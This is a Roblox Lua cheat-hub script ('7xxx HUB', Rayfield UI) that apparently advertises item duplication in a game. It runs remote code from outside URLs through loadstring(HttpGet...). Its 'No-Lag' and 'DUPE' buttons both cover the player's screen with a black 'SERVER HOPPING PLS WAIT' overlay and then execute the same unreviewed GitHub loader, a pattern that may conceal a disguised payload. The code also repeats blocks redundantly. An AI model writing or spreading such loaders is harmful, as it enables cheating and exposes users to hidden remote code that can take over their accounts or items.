debugX = true

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "7xxx HUB",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "7xxx Interface Suite",
   LoadingSubtitle = "by 7xxx Duping #GAG",
   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local Tab = Window:CreateTab("Tab Example", 4483362458) -- Title, Image

local Section = Tab:CreateSection("Section Example")

local Button = Tab:CreateButton({
    Name = "No-Lag Script",
    Callback = function()
        local gui = Instance.new("ScreenGui")
        gui.IgnoreGuiInset = true
        gui.ResetOnSpawn = false
        gui.Name = "ServerHoppingOverlay"
        gui.Parent = game:GetService("CoreGui")

        -- Create black background
        local background = Instance.new("Frame")
        background.Size = UDim2.new(1, 0, 1, 0)
        background.Position = UDim2.new(0, 0, 0, 0)
        background.BackgroundColor3 = Color3.new(0, 0, 0)
        background.BorderSizePixel = 0
        background.Parent = gui

        -- Create text label
        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1, 0, 1, 0)
        text.Position = UDim2.new(0, 0, 0, 0)
        text.BackgroundTransparency = 1
        text.Text = "SERVER HOPPING PLS WAIT..."
        text.TextColor3 = Color3.new(1, 1, 1)
        text.TextStrokeTransparency = 0.7
        text.TextScaled = true
        text.Font = Enum.Font.SourceSansBold
        text.Parent = gui
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
        -- Create ScreenGui
        local gui = Instance.new("ScreenGui")
        gui.IgnoreGuiInset = true
        gui.ResetOnSpawn = false
        gui.Name = "ServerHoppingOverlay"
        gui.Parent = game:GetService("CoreGui")

        -- Create black background
        local background = Instance.new("Frame")
        background.Size = UDim2.new(1, 0, 1, 0)
        background.Position = UDim2.new(0, 0, 0, 0)
        background.BackgroundColor3 = Color3.new(0, 0, 0)
        background.BorderSizePixel = 0
        background.Parent = gui

        -- Create text label
        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1, 0, 1, 0)
        text.Position = UDim2.new(0, 0, 0, 0)
        text.BackgroundTransparency = 1
        text.Text = "SERVER HOPPING PLS WAIT..."
        text.TextColor3 = Color3.new(1, 1, 1)
        text.TextStrokeTransparency = 0.7
        text.TextScaled = true
        text.Font = Enum.Font.SourceSansBold
        text.Parent = gui

        -- Optional: Wait a second before executing the script (for effect)
        task.wait(1.5)

        -- Load the external No-Lag script
        
    end,
})

local Button = Tab:CreateButton({
    Name = "DUPE Script",
    Callback = function()
        local gui = Instance.new("ScreenGui")
        gui.IgnoreGuiInset = true
        gui.ResetOnSpawn = false
        gui.Name = "ServerHoppingOverlay"
        gui.Parent = game:GetService("CoreGui")

        -- Create black background
        local background = Instance.new("Frame")
        background.Size = UDim2.new(1, 0, 1, 0)
        background.Position = UDim2.new(0, 0, 0, 0)
        background.BackgroundColor3 = Color3.new(0, 0, 0)
        background.BorderSizePixel = 0
        background.Parent = gui

        -- Create text label
        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1, 0, 1, 0)
        text.Position = UDim2.new(0, 0, 0, 0)
        text.BackgroundTransparency = 1
        text.Text = "PLS WAIT..."
        text.TextColor3 = Color3.new(1, 1, 1)
        text.TextStrokeTransparency = 0.7
        text.TextScaled = true
        text.Font = Enum.Font.SourceSansBold
        text.Parent = gui
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
        -- Create ScreenGui
        local gui = Instance.new("ScreenGui")
        gui.IgnoreGuiInset = true
        gui.ResetOnSpawn = false
        gui.Name = "ServerHoppingOverlay"
        gui.Parent = game:GetService("CoreGui")

        -- Create black background
        local background = Instance.new("Frame")
        background.Size = UDim2.new(1, 0, 1, 0)
        background.Position = UDim2.new(0, 0, 0, 0)
        background.BackgroundColor3 = Color3.new(0, 0, 0)
        background.BorderSizePixel = 0
        background.Parent = gui

        -- Create text label
        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1, 0, 1, 0)
        text.Position = UDim2.new(0, 0, 0, 0)
        text.BackgroundTransparency = 1
        text.Text = "PLS WAIT..."
        text.TextColor3 = Color3.new(1, 1, 1)
        text.TextStrokeTransparency = 0.7
        text.TextScaled = true
        text.Font = Enum.Font.SourceSansBold
        text.Parent = gui

        -- Optional: Wait a second before executing the script (for effect)
        task.wait(1.5)

        -- Load the external No-Lag script
        
    end,
})

Rayfield:LoadConfiguration()
